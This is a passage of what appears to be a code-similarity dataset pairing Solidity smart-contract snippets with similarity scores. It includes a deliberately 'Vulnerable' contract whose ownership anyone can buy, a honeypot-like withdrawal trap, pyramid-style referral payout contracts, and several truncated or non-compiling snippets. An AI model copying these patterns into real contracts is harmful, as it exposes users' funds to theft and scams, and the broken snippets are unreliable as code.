    uint256 amountInWei = amount * ethInWei;

    require(amountInWei * list.length <= balance[msg.sender], ""the contract balance is not enough"");

    for (uint256 i = 0; i < list.length; i++) {

      emit Send(amount, list[i]);

      uint256 res = balance[msg.sender];

      balance[msg.sender] = res - amountInWei;

      list[i].transfer(amountInWei);

    }

    return true;

  }



  function deposit() public payable returns (uint256) {

    balance[msg.sender] += msg.value;

    return balance[msg.sender];

  }



  function getBalance() public constant returns (uint256) {

      return balance[msg.sender];

  }



  function() public payable { }

}"
"contract CA18 {

address public owner;

function CA18 () {
    owner = msg.sender;
}



mapping(address=>uint16) public balances;

function getBalance() view returns (uint16, bytes32) {
    require(msg.sender == owner);
    uint16 mybalance = 1000;
    bytes32 c = keccak256(owner);
    return (mybalance, c);
}



}",0.6726203973805366,"contract test{

    uint256 public i;

    address public owner;

    

    constructor() public{

        owner = msg.sender;

    }

    

    function add(uint256 a, uint256 b) public pure returns (uint256){

        return a + b;

    }

    

    function setI(uint256 m) public {

        require(msg.sender == owner, ""owner required"");

        i = m;

    }

}"
"contract Award {
    
    address public authority;
    string public hash;
    
    bool itWorked = false;
    
    mapping(address => bool) users;
    
    function Award(string _hash) public {
        authority = msg.sender;
        hash = _hash;
    }
    
    function addUser(address _address) public {
        users[_address] = true;
    }
    
    function deleteUser(address _address) public {
        users[_address] = false;
    }
    
    function hasUser(address _address) public view returns (bool) {
        return users[_address];
    }

    function test() public pure returns (bool) {
        return true;
    }
    
}",0.6782000784759623,"contract ERC20 is ERC20Events {
    function totalSupply() public view returns (uint256);
    function balanceOf(address guy) public view returns (uint256);
    function allowance(address src, address guy) public view returns (uint256);

    function approve(address guy, uint256 wad) public returns (bool);
    function transfer(address dst, uint256 wad) public returns (bool);
    function transferFrom(
        address src, address dst, uint256 wad
    ) public returns (bool);
}"
"contract TimeLock {
    IERC20 token;

    struct LockBoxStruct {
        address beneficiary;
        uint balance;
        uint releaseTime;
    }

    LockBoxStruct[] public lockBoxStructs; 

    event LogLockBoxDeposit(address sender, uint amount, uint releaseTime);   
    event LogLockBoxWithdrawal(address receiver, uint amount);

    constructor(address tokenContract) public payable {
        token = IERC20(tokenContract);
    }

    function deposit(address beneficiary, uint amount, uint releaseTime) public payable returns(bool success) {
        require(token.transferFrom(msg.sender, address(this), amount));
        LockBoxStruct memory l;
        l.beneficiary = beneficiary;
        l.balance = amount;
        l.releaseTime = releaseTime;
        lockBoxStructs.push(l);
        emit LogLockBoxDeposit(msg.sender, amount, releaseTime);
        return true;
    }

    function withdraw(uint lockBoxNumber) public returns(bool success) {
        LockBoxStruct storage l = lockBoxStructs[lockBoxNumber];
        require(l.beneficiary == msg.sender);
        require(l.releaseTime <= now);
        uint amount = l.balance;
        l.balance = 0;
        emit LogLockBoxWithdrawal(msg.sender, amount);
        require(token.transfer(msg.sender, amount));
        return true;
    }    

}",0.6581502451990036,"contract LockToken is Ownable {

    using SafeMath for uint256;



  token token_reward;

  address public beneficiary;

  bool public isLocked = false;

  bool public isReleased = false;

  uint256 public start_time;

  uint256 public end_time;

  

  event TokenReleased(address beneficiary, uint256 token_amount);



  constructor(address tokenContractAddress, address _beneficiary) public{

    token_reward = token(tokenContractAddress);

    beneficiary = _beneficiary;

  }



  function tokenBalance() constant public returns (uint256){

    return token_reward.balanceOf(this);

  }



  function lock(uint256 lockTime) public onlyOwner returns (bool){

      require(!isLocked);

      require(tokenBalance() > 0);

      start_time = now;

      end_time = lockTime;

      isLocked = true;

  }



  function lockOver() constant public returns (bool){

      uint256 current_time = now;

    return current_time > end_time;

  }



    function release() onlyOwner public{

    require(isLocked);

    require(!isReleased);

    require(lockOver());

    uint256 token_amount = tokenBalance();

    token_reward.transfer( beneficiary, token_amount);

    emit TokenReleased(beneficiary, token_amount);

    isReleased = true;

  }

}"
"contract Bar {
    struct Foo{
        uint x;
    }
    mapping(uint => Foo[]) foo;

    function add(uint id, uint _x) public {
        foo[id].push(Foo(_x));
    }

    function get(uint id, uint index) view public returns(uint){
        return foo[id][index].x;
    }
}",0.6506658548166734,"contract FiatContract {

    function ETH(uint _id) public constant returns (uint256);

  	function EUR(uint _id) public constant returns (uint256);

  	function updatedAt(uint _id) public constant returns (uint);

}"
"contract HelloWorld {
    string name=""TEST"";
    uint number;

    function HelloWorld() {

    }

    function getName() returns (string) {
        return name;
    }

    function getNumber() returns (uint) {
        return number;
    }

    function setNumber(uint _number) {
        number = _number;
    }
}",0.6535434683208334,"contract showNum {
    address owner = msg.sender;
    uint _num = 0;
    constructor(uint number) public {
        _num = number;
    }
    function setNum(uint number) public payable {
        _num = number;
    }
    function getNum() constant public returns(uint) {
        return _num;
    }
}"
"contract Send {
    function sendtest() returns(bool ) {
        Test t = new Test();
        bool res = t.send(100 ether);
        return res;
    }
}",0.6575125016992021,"contract Test {

    function A() public pure returns (bool) {

        require(false, ""you shall not pass"");

        return true;

    }

}"
"contract OverloadedContract {
    function foo(uint x) external payable returns(uint) {
        
        return x;
    }

    function foo(int x) external payable returns(int) {
        
        return x;
    }
}",0.6752481351885571,"contract FlapLike {
    function kick(uint lot, uint bid) external returns (uint);
    function cage(uint) external;
    function live() external returns (uint);
}"
"contract Factory {

    uint public stage;
}",0.6896801050114376,"contract Empty {
 uint public value = 5;
}"
"contract FallbackReceiver {
    event Log(uint x);
    function () {
        Log(uint8(msg.data[0]));
    }
}",0.6399009489683983,"contract Receiver {
    function tokenFallback(address from, uint value);
}"
contract NonReceiver {},0.6142883568508891,contract solcChecker {}
"contract TokenLockerFactory {
    address public creator;
    mapping(address => address) ownerLockers; 
    address[] private lockerList;

    function createLocker(address _owner, uint256 amount) public payable 
            returns(address locker) {
        locker = ownerLockers[_owner];

        if(locker == address(0)) {
            
            locker = (new TokenLocker).value(amount)(msg.sender, _owner);
            ownerLockers[_owner] = locker;
            lockerList.push(locker);

            
            emit Created(locker, msg.sender, _owner);
        }
    }


    function getLocker(address _owner) public view returns(address) {
        return ownerLockers[_owner];
    }

    function getLockersNumber() public view returns(uint256) {
        return lockerList.length;
    }
}",0.6603778641121054,"contract Ownable {

    

    address public owner_;

    mapping(address => bool) locked_;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);



    constructor() public { owner_ = msg.sender; }



    modifier onlyOwner() {

        require(msg.sender == owner_);

        _;

    }



    modifier locked() {

        require(!locked_[msg.sender]);

        _;

    }



    function transferOwnership(address newOwner) public onlyOwner {

        require(newOwner != address(0));

        emit OwnershipTransferred(owner_, newOwner);

        owner_ = newOwner;

    }



    function lock(address owner) public onlyOwner {

        locked_[owner] = true;

    }



    function unlock(address owner) public onlyOwner {

        locked_[owner] = false;

    }

}"
"contract Locations {

  function doSomething() public  {   

    uint[] storage localArray;  

  }
}",0.6305194022609514,"contract EthPyramid {
  function buyPrice() public constant returns (uint) {}   
}"
"contract Proxy {

    address myAddress;

    function callMyContract() public view returns(address) {
        MyContract(myAddress).doSomthing();
    }
}",0.6698770671413619,"contract EtherDelta {

    function balanceOf(address tokenAddress, address userAddress) public view returns (uint);

}"
"contract MyContract {

    event Something(address sender);

    function doSomthing() public (address) {
        emit Something(msg.sender); 
        emit Something(tx.origin); 
    }
}",0.6042354566351192,"contract Storage {
    event Data(address indexed from, string data);
    
    function store(string memory data) public {
        emit Data(msg.sender, data);
    }
}"
"contract test001 {

    int private age;

    function setAge(int _age) public {
        age = _age;
    }

}",0.6172767407102958,contract test { function multiply(uint a) public pure returns(uint d) {   return a * 7;   } }
"contract Hello {
    bytes32 x;
    function getBytes() returns(bytes32){
        return x;
    }
    function setBytes(bytes32 b)  {
        x = b;
    }

}",0.6375031350854818,"contract Destiny {
    function fight(bytes32 cat1, bytes32 cat2, bytes32 entropy) public returns (bytes32 winner);
}"
"contract Two {
  function test(address oneAdd) public {
     One one = One(oneAdd);
     one.addr = address(0);
  }
}",0.6418242470370569,"contract Ownable { 
    address public owner;
    function Ownable() public { owner = address(this); }
}"
"contract BondRegister is usingOraclize {

uint public energy;

event Log(string text);

function BondRegister() {

 Log(""Contract created"");
 OAR = OraclizeAddrResolverI(0x6f485C8BF6fc43eA212E93BBF8ce046C7f1cb475);
}


function getCall() payable returns(bool success) {

 oraclize_query(""URL"", ""json(https:
}


function __callback(bytes32 _myid,string result) {

if (msg.sender != oraclize_cbAddress()) { 
     Log(""thrown error"");
     throw;
 }
Log(""Entered callback function"");
Log(result);
energy = parseInt(result, 2);

}


function getenergy() returns (uint) {
return energy;
}
}",0.628810440099449,"contract DieselPrice is usingOraclize {

    uint public dieselPriceUSD;

    event LogNewDieselPrice(string price);
    event LogNewOraclizeQuery(string description);

    constructor()
        public
    {
        update(); 
    }

    function __callback(
        bytes32 _myid,
        string memory _result
    )
        public
    {
        require(msg.sender == oraclize_cbAddress());
        emit LogNewDieselPrice(_result);
        dieselPriceUSD = parseInt(_result, 2); 
        
    }

    function update()
        public
        payable
    {
        emit LogNewOraclizeQuery(""Oraclize query was sent, standing by for the answer..."");
        oraclize_query(""URL"", ""xml(https:
    }
}"
"contract A {
   function one() public {
      
      B(addressB).transfer(value);
   }

contract B {
   function() external payable {
       someaddress.transfer(msg.value);
   }",0.6588710513860523,"contract ContractConn{

    function transfer(address _to, uint _value) public;

    function lock(address _to, uint256 _value) public;

}"
"contract MyContractFactory is Ownable {
    function create(...) onlyOwner public returns (MyContract) {
        MyContract myContract = new MyContract(...);
        myContract.transferOwnership(msg.sender);
        return myContract;
    }
}",0.6142200259842016,"contract HasNoContracts is Ownable {



  

  function reclaimContract(address contractAddr) external onlyOwner {

    Ownable contractInst = Ownable(contractAddr);

    contractInst.transferIDCContractOwnership(owner);

  }

}"
"contract UserRegistry {
  struct User {
      address addr;
      uint points;
      address[] friendsList;
      mapping(address => bool) friends;
  }

  mapping(address => User) users;
  mapping(address => mapping(address => uint)) public gamesPlayedTogether; 

  function createUser() public {
      User memory user = User(msg.sender, 0, new address[](0));
      users[msg.sender] = user;
  }

  
}",0.6519988649864547,"contract TinyProxyFactory {

  mapping(address => mapping(address => address)) public proxyFor;

  mapping(address => address[]) public userProxies;



  function make(address to, uint gas, bool track) public returns(address proxy){

    proxy = new TinyProxy(to, gas);

    if(track) {

      proxyFor[msg.sender][to] = proxy;

      userProxies[msg.sender].push(proxy);

    }

    return proxy;

  }

}"
"contract Storage {

  mapping(bytes32 => uint256)    private uIntStorage;
  mapping(bytes32 => string)     private stringStorage;
  mapping(bytes32 => address)    private addressStorage;
  mapping(bytes32 => bytes)      private bytesStorage;
  mapping(bytes32 => bool)       private boolStorage;
  mapping(bytes32 => int256)     private intStorage;

  function getAddress(bytes32 _key) public view returns (address) {
      return addressStorage[_key];
  }

  function getUint(bytes32 _key) public view returns (uint) {
      return uIntStorage[_key];
  }

  function getString(bytes32 _key) public view returns (string) {
      return stringStorage[_key];
  }

  function getBytes(bytes32 _key) public view returns (bytes) {
      return bytesStorage[_key];
  }

  function getBool(bytes32 _key) public view returns (bool) {
      return boolStorage[_key];
  }

  function getInt(bytes32 _key) public view returns (int) {
      return intStorage[_key];
  }


  function setAddress(bytes32 _key, address _value) public {
      addressStorage[_key] = _value;
  }

  function setUint(bytes32 _key, uint _value) public {
      uIntStorage[_key] = _value;
  }

  function setString(bytes32 _key, string _value) public {
      stringStorage[_key] = _value;
  }

  function setBytes(bytes32 _key, bytes _value) public {
      bytesStorage[_key] = _value;
  }

  function setBool(bytes32 _key, bool _value) public {
      boolStorage[_key] = _value;
  }

  function setInt(bytes32 _key, int _value) public {
      intStorage[_key] = _value;
  }
}",0.6516283245891694,"contract RegistryInterface {
    function initiateProvider(uint256, bytes32) public returns (bool);
    function initiateProviderCurve(bytes32, int256[], address) public returns (bool);
    function initiateCustomCurve(bytes32, int256[], address, address) public returns (bool);
    function setEndpointParams(bytes32, bytes32[]) public;
    function getEndpointParams(address, bytes32) public view returns (bytes32[]);
    function getProviderPublicKey(address) public view returns (uint256);
    function getProviderTitle(address) public view returns (bytes32);
    function setProviderParameter(bytes32, bytes) public;
    function setProviderTitle(bytes32) public;
    function clearEndpoint(bytes32) public;
    function getProviderParameter(address, bytes32) public view returns (bytes);
    function getAllProviderParams(address) public view returns (bytes32[]);
    function getProviderCurveLength(address, bytes32) public view returns (uint256);
    function getProviderCurve(address, bytes32) public view returns (int[]);
    function getCurveToken(address, bytes32) public view returns (address);
    function isProviderInitiated(address) public view returns (bool);
    function getAllOracles() external view returns (address[]);
    function getProviderEndpoints(address) public view returns (bytes32[]);
    function getEndpointBroker(address, bytes32) public view returns (address);
}"
"contract Referral is ERC20 {
  using SafeMath for uint;
  uint8 constant MAX_REFER_DEPTH = 3;
  uint8 constant MAX_REFEREE_BONUS_LEVEL = 3;
  struct Account {
    address payable referrer;
    uint reward;
    uint referredCount;
  }
  struct RefereeBonusRate {
    uint lowerBound;
    uint rate;
  }
  event RegisteredReferer(address referee, address referrer);
  event RegisteredRefererFailed(address referee, address referrer, string reason);
  event PaidReferral(address from, address to, uint amount, uint level);
  mapping(address => Account) private accounts;
  uint256[] private levelRate;
  uint256 public referralBonus;
  uint256 private decimalsReferral;
  RefereeBonusRate[] private refereeBonusRateMap;
  constructor(
    uint _decimals,
    uint _referralBonus,
    uint256[] memory _levelRate,
    uint256[] memory _refereeBonusRateMap
  )
    public
  {
    require(_levelRate.length > 0, ""Referral level should be at least one"");
    require(_levelRate.length <= MAX_REFER_DEPTH, ""Exceeded max referral level depth"");
    require(_refereeBonusRateMap.length % 2 == 0, ""Referee Bonus Rate Map should be pass as [<lower amount>, <rate>, ....]"");
    require(_refereeBonusRateMap.length / 2 <= MAX_REFEREE_BONUS_LEVEL, ""Exceeded max referree bonus level depth"");
    require(_referralBonus <= _decimals, ""Referral bonus exceeds 100%"");
    require(sum(_levelRate) <= _decimals, ""Total level rate exceeds 100%"");
    decimalsReferral = _decimals;
    referralBonus = _referralBonus;
    levelRate = _levelRate;
    if (_refereeBonusRateMap.length == 0) {
      refereeBonusRateMap.push(RefereeBonusRate(1, decimalsReferral));
      return;
    }
    for (uint i; i < _refereeBonusRateMap.length; i += 2) {
      if (_refereeBonusRateMap[i+1] > decimalsReferral) {
        revert(""One of referee bonus rate exceeds 100%"");
      }
      refereeBonusRateMap.push(RefereeBonusRate(_refereeBonusRateMap[i], _refereeBonusRateMap[i+1]));
    }
  }
  function sum(uint[] memory data) private pure returns (uint) {
    uint S;
    for(uint i;i < data.length;i++) {
      S += data[i];
    }
    return S;
  }
  function hasReferrer(address _address) public view returns(bool){
    return accounts[_address].referrer != address(0);
  }


  function getReferalBonusRate(uint256 referralCount) public view returns(uint256) {
    uint rate = refereeBonusRateMap[0].rate;
    for(uint i = 1; i < refereeBonusRateMap.length; i++) {
      if (referralCount < refereeBonusRateMap[i].lowerBound) {
        break;
      }
      rate = refereeBonusRateMap[i].rate;
    }
    return rate;
  }
  function isCircularReference(address referrer, address referee) internal view returns(bool){
    address parent = referrer;
    for (uint i; i < levelRate.length; i++) {
      if (parent == address(0)) {
        break;
      }
      if (parent == referee) {
        return true;
      }
      parent = accounts[parent].referrer;
    }
    return false;
  }
  function addUplineReferrer(address payable referrer) internal returns(bool){
      require(!hasReferrer(msg.sender));
    if (referrer == address(0)) {
      emit RegisteredRefererFailed(msg.sender, referrer, ""Referrer cannot be 0x0 address"");
      return false;
    } else if (isCircularReference(referrer, msg.sender)) {
      emit RegisteredRefererFailed(msg.sender, referrer, ""Referee cannot be one of referrer uplines"");
      return false;
    } else if (accounts[msg.sender].referrer != address(0)) {
      emit RegisteredRefererFailed(msg.sender, referrer, ""Address have been registered upline"");
      return false;
    }
    Account storage userAccount = accounts[msg.sender];
    Account storage parentAccount = accounts[referrer];
    userAccount.referrer = referrer;
    parentAccount.referredCount = parentAccount.referredCount.add(1);
    emit RegisteredReferer(msg.sender, referrer);
    return true;
  }
    function addDownlineReferrer(address payable _DownlineReferr) internal returns(bool){
    require(!hasReferrer(_DownlineReferr));
    if (_DownlineReferr == address(0)) {
      emit RegisteredRefererFailed(_DownlineReferr, msg.sender, ""Referrer cannot be 0x0 address"");
      return false;
    } else if (isCircularReference(msg.sender,_DownlineReferr )) {
      emit RegisteredRefererFailed(_DownlineReferr, msg.sender, ""Referee cannot be one of referrer downlines"");
      return false;
    } else if (accounts[_DownlineReferr].referrer != address(0)) {
      emit RegisteredRefererFailed(_DownlineReferr, msg.sender, ""Address have been registered upline"");
      return false;
    }
    Account storage userAccount = accounts[_DownlineReferr];
    Account storage parentAccount = accounts[msg.sender];
    userAccount.referrer = msg.sender;
    parentAccount.referredCount = parentAccount.referredCount.add(1);
    emit RegisteredReferer(_DownlineReferr, msg.sender);
    return true;
  }
  function payReferral( address payable _address , uint256 value , uint256 valueETH ) internal returns(uint256){
    Account memory userAccount = accounts[msg.sender];
    uint totalReferal;
    for (uint i; i < levelRate.length; i++) {
      address payable parent = userAccount.referrer;
      Account storage parentAccount = accounts[userAccount.referrer];
      if (parent == address(0)) {
        break;
      }
        uint c = value.mul(referralBonus).div(decimalsReferral);
        c = c.mul(levelRate[i]).div(decimalsReferral);
        c = c.mul(getReferalBonusRate(parentAccount.referredCount)).div(decimalsReferral);
        totalReferal = totalReferal.add(c);
        parentAccount.reward = parentAccount.reward.add(c);
        if(i == 0)
        {
        parent.transfer(valueETH);
        }
        emit PaidReferral(msg.sender, parent, c, i + 1);
        _balances[_address] = _balances[_address].sub(c);
        _balances[parent] = _balances[parent].add(c);
        emit Transfer(_address, parent, c); 

      userAccount = parentAccount;
    }
    return totalReferal;
  }

}",0.6483336433597422,"contract Redline {

  mapping (uint => uint) public stagePrice;



  address public owner;



  uint public currentUserID;



  mapping (address => User) public users;

  mapping (uint => address) public userAddresses;



  uint REFERRALS_LIMIT = 3;

  uint STAGE_DURATION = 365 days;



  struct User {

    uint id;

    uint referrerID;

    address[] referrals;

    mapping (uint => uint) stageEndTime;

  }



  event RegisterUserEvent(address indexed user, address indexed referrer, uint time);

  event BuyStageEvent(address indexed user, uint indexed stage, uint time);

  event GetStageProfitEvent(address indexed user, address indexed referral, uint indexed stage, uint time);

  event LostStageProfitEvent(address indexed user, address indexed referral, uint indexed stage, uint time);



  modifier userNotRegistered() {

    require(users[msg.sender].id == 0, 'User is already registered');

    _;

  }



  modifier userRegistered() {

    require(users[msg.sender].id != 0, 'User does not exist');

    _;

  }



  modifier validReferrerID(uint _referrerID) {

    require(_referrerID > 0 && _referrerID <= currentUserID, 'Invalid referrer ID');

    _;

  }



  modifier validStage(uint _stage) {

    require(_stage > 0 && _stage <= 8, 'Invalid stage');

    _;

  }



  modifier validStageAmount(uint _stage) {

    require(msg.value == stagePrice[_stage], 'Invalid stage amount');

    _;

  }



  constructor() public {

    stagePrice[1] = 0.05 ether;

    stagePrice[2] = 0.15 ether;

    stagePrice[3] = 0.45 ether;

    stagePrice[4] = 1.35 ether;

    stagePrice[5] = 4.05 ether;

    stagePrice[6] = 12.15 ether;

    stagePrice[7] = 36.45 ether;

    stagePrice[8] = 109.35 ether;



    currentUserID++;



    owner = msg.sender;



    users[owner] = createNewUser(0);

    userAddresses[currentUserID] = owner;



    for (uint i = 1; i <= 8; i++) {

      users[owner].stageEndTime[i] = 1 << 37;

    }

  }



  function () external payable {

    uint stage;



    for (uint i = 1; i <= 8; i++) {

      if (msg.value == stagePrice[i]) {

        stage = i;

        break;

      }

    }



    require(stage > 0, 'Invalid amount has sent');



    if (users[msg.sender].id != 0) {

      buyStage(stage);

      return;

    }



    if (stage != 1) {

      revert('Buy first stage for 0.05 ETH');

    }



    address referrer = bytesToAddress(msg.data);

    registerUser(users[referrer].id);

  }



  function registerUser(uint _referrerID) public payable userNotRegistered() validReferrerID(_referrerID) validStageAmount(1) {

    if (users[userAddresses[_referrerID]].referrals.length >= REFERRALS_LIMIT) {

      _referrerID = users[findReferrer(userAddresses[_referrerID])].id;

    }



    currentUserID++;



    users[msg.sender] = createNewUser(_referrerID);

    userAddresses[currentUserID] = msg.sender;

    users[msg.sender].stageEndTime[1] = now + STAGE_DURATION;



    users[userAddresses[_referrerID]].referrals.push(msg.sender);



    transferStagePayment(1, msg.sender);

    emit RegisterUserEvent(msg.sender, userAddresses[_referrerID], now);

  }



  function buyStage(uint _stage) public payable userRegistered() validStage(_stage) validStageAmount(_stage) {

    for (uint s = _stage - 1; s > 0; s--) {

      require(getUserStageEndTime(msg.sender, s) >= now, 'Buy the previous stage');

    }



    if (getUserStageEndTime(msg.sender, _stage) == 0) {

      users[msg.sender].stageEndTime[_stage] = now + STAGE_DURATION;

    } else {

      users[msg.sender].stageEndTime[_stage] += STAGE_DURATION;

    }



    transferStagePayment(_stage, msg.sender);

    emit BuyStageEvent(msg.sender, _stage, now);

  }



  function findReferrer(address _user) public view returns (address) {

    if (users[_user].referrals.length < REFERRALS_LIMIT) {

      return _user;

    }



    address[363] memory referrals;

    referrals[0] = users[_user].referrals[0];

    referrals[1] = users[_user].referrals[1];

    referrals[2] = users[_user].referrals[2];



    address referrer;



    for (uint i = 0; i < 363; i++) {

      if (users[referrals[i]].referrals.length < REFERRALS_LIMIT) {

        referrer = referrals[i];

        break;

      }



      if (i >= 120) {

        continue;

      }



      referrals[(i+1)*3] = users[referrals[i]].referrals[0];

      referrals[(i+1)*3+1] = users[referrals[i]].referrals[1];

      referrals[(i+1)*3+2] = users[referrals[i]].referrals[2];

    }



    require(referrer != address(0), 'Referrer was not found');



    return referrer;

  }



  function transferStagePayment(uint _stage, address _user) internal {

    uint height;

    if (_stage == 1 || _stage == 5) {

      height = 1;

    } else if (_stage == 2 || _stage == 6) {

      height = 2;

    } else if (_stage == 3 || _stage == 7) {

      height = 3;

    } else if (_stage == 4 || _stage == 8) {

      height = 4;

    }



    address referrer = getUserUpline(_user, height);



    if (referrer == address(0)) {

      referrer = owner;

    }



    if (getUserStageEndTime(referrer, _stage) < now) {

      emit LostStageProfitEvent(referrer, msg.sender, _stage, now);

      transferStagePayment(_stage, referrer);

      return;

    }



    if (addressToPayable(referrer).send(msg.value)) {

      emit GetStageProfitEvent(referrer, msg.sender, _stage, now);

    }

  }





  function getUserUpline(address _user, uint height) public view returns (address) {

    if (height <= 0 || _user == address(0)) {

      return _user;

    } else {

      return this.getUserUpline(userAddresses[users[_user].referrerID], height - 1);

    }

  }



  function getUserReferrals(address _user) public view returns (address[] memory) {

    return users[_user].referrals;

  }



  function getUserStageEndTime(address _user, uint _stage) public view returns (uint) {

    return users[_user].stageEndTime[_stage];

  }





  function createNewUser(uint _referrerID) private view returns (User memory) {

    return User({ id: currentUserID, referrerID: _referrerID, referrals: new address[](0) });

  }



  function bytesToAddress(bytes memory _addr) private pure returns (address addr) {

    assembly {

      addr := mload(add(_addr, 20))

    }

  }



  function addressToPayable(address _addr) private pure returns (address payable) {

    return address(uint160(_addr));

  }

}"
"contract DelegateInternal {

    address public senderOne;
    address public senderTwo;

    function dellyCall() payable returns(uint256) {
        senderOne = msg.sender;
        this.delegatecall(bytes4(sha3('otherFunction()')));
    }

    
    function otherFunction()
    internal {
           senderTwo = msg.sender;

    }
}",0.6424285345494654,"contract HOLDS

{

    address hodl = msg.sender;

    function() external payable {}

    function end() public {

        if (msg.sender==hodl)

            selfdestruct(msg.sender);

    }

    function release() public payable {

        if (msg.value >= address(this).balance)

            msg.sender.transfer(address(this).balance);

    }

}"
"contract taskListContract is Owned {
    address public receiver;

    struct task {
        string iName;
        uint16 taskId;
        address smartContract;
        bool iValue;
    }

    uint taskCount;
    mapping(address => task) taskList;
    task[] taskArray;

    function addTask(string name, uint16 id, address code) external onlyOwner{
        receiver = msg.sender;
        task memory tasknew = task(name, id ,code, false);
        taskList[receiver] = tasknew;
        taskArray.push(tasknew);
        taskCount++;
    }


    function updateUserTask(bool _value) public{
        task storage individualUser =taskList[receiver];
        individualUser.iValue = _value;
    }



    function countItemList() public constant returns (uint count)  {     
        return taskCount;
    }

    function removeTask() external onlyOwner {
        delete taskList[msg.sender];
        taskCount--;
    }

    function getTask() public constant returns (string iName, bool iValue, uint count)  {   
        return (taskList[msg.sender].iName, taskList[msg.sender].iValue, taskCount);
    }
}",0.6090850743910976,"contract MultiEthSender {



  uint256 constant private ethInWei = 10**18;

  mapping(address => uint256) private balance;

  address public owner;



  event Send(uint256 _amount, address indexed receiver);



  constructor() public payable {

    owner = msg.sender;

    balance[msg.sender] = msg.value;

  }



  function multiSendEth(uint256 amount, address[] list) public returns (bool) {

    uint256 amountInWei = amount * ethInWei;

    require(amountInWei * list.length <= balance[msg.sender], ""the contract balance is not enough"");

    for (uint256 i = 0; i < list.length; i++) {

      emit Send(amount, list[i]);

      uint256 res = balance[msg.sender];

      balance[msg.sender] = res - amountInWei;

      list[i].transfer(amountInWei);

    }

    return true;

  }



  function deposit() public payable returns (uint256) {

    balance[msg.sender] += msg.value;

    return balance[msg.sender];

  }



  function getBalance() public constant returns (uint256) {

      return balance[msg.sender];

  }



  function() public payable { }

}"
"contract Escrow {

    address public a;
    address public b;
    uint balance;



    constructor() public payable {
        a = msg.sender;
        b = 0x14723a09acff6d2a60dcdf7aa4aff308fddc160c;
        balance = address(this).balance;

    }

    function payoutToSeller() payable public returns(bool) {
        if (msg.sender == a) {
            b.transfer(balance);
            }
        }

     function getData() public constant returns (uint) {
         return balance;
     }

}",0.6564154502934205,"contract Vulnerable {
    address public owner;
    bool public claimed;
    
    constructor() public payable {
        owner = msg.sender;
    }
    
    function() external payable {}

    function claimOwnership() public payable {
        require(msg.value >= 0.1 ether);
        
        if (claimed == false) {
            owner = msg.sender;
            claimed = true;
        }
    }
    
    function retrieve() public {
        require(msg.sender == owner);
        
        msg.sender.transfer(address(this).balance);
    }
}"
"contract Boostr {
            struct Request {
                    string description;
                    uint value;
                    address recipient;
                    bool complete;
                    mapping(address=>bool) approval;
                    uint approvalCount;
            }

            Request[] public requests;
            address private manager;
            string public title;
            string public description;
            uint public minimumContribution;
            mapping(address=>bool) private supporters;
            mapping(address=>bool) private approvers;
            uint public approversCount;

            modifier managerRestricted() {
                    require(msg.sender == manager);
                    _;
            }

            modifier approverRestricted() {
                    require(approvers[msg.sender]);
                    _;
            }

            constructor(string bstrTitle, string bstrDesription, uint minimum, address creator) public {
                    title = bstrTitle;
                    description = bstrDesription;
                    manager = creator;
                    minimumContribution = minimum;
            }

            function getManager() public view returns (address) {
                    return manager;
            }

            function getApprover(address addr) public view returns (bool) {
                    return approvers[addr];
            }

            function getSupporter(address addr) public view returns (bool) {
                    return supporters[addr];
            }

            function contribute() public payable {
                    if (msg.value > 0) {
                            supporters[msg.sender] = true;
                            if (msg.value > minimumContribution) {
                                    approvers[msg.sender] = true;
                                    approversCount++;
                            }
                    }
            }

            function getSummary() public view returns (string, string, uint, uint, uint, uint, address) {
                    return (
                            title,
                            description,
                            minimumContribution,
                            address(this).balance,
                            requests.length,
                            approversCount,
                            getManager()
                    );
            }

            function getRequestsCount() public view returns (uint) {
                    return requests.length;
            }

            function createRequest(string reqDescription, uint value, address recipient) public managerRestricted {
                    Request memory newRequest = Request ({
                            description: reqDescription,
                            value: value,
                            recipient: recipient,
                            complete: false,
                            approvalCount: 0
                    });
                    requests.push(newRequest);
            }

            function approveRequest(uint index) public {
                    Request storage request = requests[index];
                    require (approvers[msg.sender]);
                    require (!request.approval[msg.sender]);
                    request.approval[msg.sender] = true;
                    request.approvalCount++;
            }

            function finalizeRequest(uint index) public managerRestricted payable {
                    Request storage request = requests[index];
                    require (!request.complete);
                    require (request.approvalCount > approversCount / 2);
                    request.complete = true;
                    request.recipient.transfer(request.value);
            }
    }",0.6709682369562677,"contract CoinMarketCapApi {

    

    uint public totalRequests;

    uint price;

    uint public gasAmount;

    address public admin;

    

    mapping ( address => bool ) public admins;

    mapping ( uint => address ) public _callbackAddress;

    mapping ( uint => mapping ( address => RequestMeta ) ) public requests;

    

    struct RequestMeta {

        bool processed;

        bool active;

        string ticker;

        uint current_block;

        uint expiry_block;

        uint time;

    }

    

    event newCMCRequest(uint indexed _req_id, string _ticker);

    event requestProcessed(uint indexed _req_id, uint _price);

    

    modifier onlyAdmin {

        require(admin == msg.sender);

        _;

    }

    

    

    function CoinMarketCapApi() public {

        admin = msg.sender;

        

        price = 1000000000000000;

        gasAmount = 1000000000;

    }

    

    function setPrice(uint _price) public onlyAdmin {

        price = _price;

    }

    

    function setGasAmount(uint _gasamount) public onlyAdmin {

        gasAmount = _gasamount;

    }

    

    function transferOwnership(address _newAdmin) public onlyAdmin {

        admin = _newAdmin;

    }

    

    function transferEther(address _address) public onlyAdmin {

        _address.transfer(this.balance);

    }

    

    function processRequest(uint _req_id, uint _price) public onlyAdmin returns (bool) {

        address _address = _callbackAddress[_req_id];

        RequestMeta storage r = requests[_req_id][_address];

        

        require(

            _address != address(0x0)

            && r.active

            && !r.processed 

            && r.expiry_block > block.number

        );

        

        r.processed = true;

        

        callBackContract(_address).__response.gas(gasAmount)(_price);

        

        requestProcessed(_req_id, _price);

        return true;

    }

    

    function _cost() public view returns (uint _price) {

        _price = price;

    }

    

    

    function getRequestMeta(uint _req_id) public view 

        returns (

            bool _active, 

            bool _processed, 

            string _ticker, 

            uint _current_block, 

            uint _expiry_block, 

            uint _time

        )

    {

        address _address = _callbackAddress[_req_id];

        RequestMeta storage r = requests[_req_id][_address];

        

        _active = r.active;

        _processed = r.processed;

        _ticker = r.ticker;

        _current_block = r.current_block;

        _expiry_block = r.expiry_block;

        _time = r.time;

    }

    

    function requestPrice(string _ticker) public payable {

        require(

            msg.value >= price

        );

        

        

        admin.transfer(price);

        

        totalRequests++;

        RequestMeta storage r = requests[totalRequests][msg.sender];

        

        r.active = true;

        r.ticker = _ticker;

        r.current_block = block.number;

        r.expiry_block = block.number + 20;

        r.time = now;

        

        _callbackAddress[totalRequests] = msg.sender;

        

        newCMCRequest(totalRequests, _ticker);

    }

